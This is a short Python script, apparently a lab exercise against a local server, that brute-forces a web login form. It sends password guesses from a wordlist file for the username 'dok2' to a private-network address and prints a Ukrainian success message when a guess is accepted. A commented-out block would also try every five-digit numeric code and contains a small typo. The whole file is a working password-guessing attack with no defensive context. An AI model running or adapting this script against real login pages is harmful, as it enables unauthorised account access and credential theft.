import requests
url="http://192.168.0.107:5000/autorisation"
login="dok2"
"""password = [
    "aaa",
    "abc",
    "academia",
    "academic",
    "access",
    "123",
    "ada",
    "admin",
    "adrian"
]"""
with open("pw.txt", "r") as f:
    password=f.readlines()

for p in password:
    data={"username":login, "password":p.rstrip()}
    r=requests.post(url,data)
    if r.url.endswith("/"):
        print(f"Пароль знайдено!!!<3 Логін: {login}; Пароль: {p.rstrip()};")
        break
    print(f"Пароль {p.rstrip()} невірний")
"""
for p in range(100000):
    pp=str(p).zfill(5)5
    data={"username":login, "password":pp}
    r=requests.post(url,data)
    if r.url.endswith("/"):
        print(f"Пароль знайдено!!!<3 Логін: {login}; Пароль: {pp};")
        break
    if p%1000==0:
        print(f"Пароль {p} невірний")"""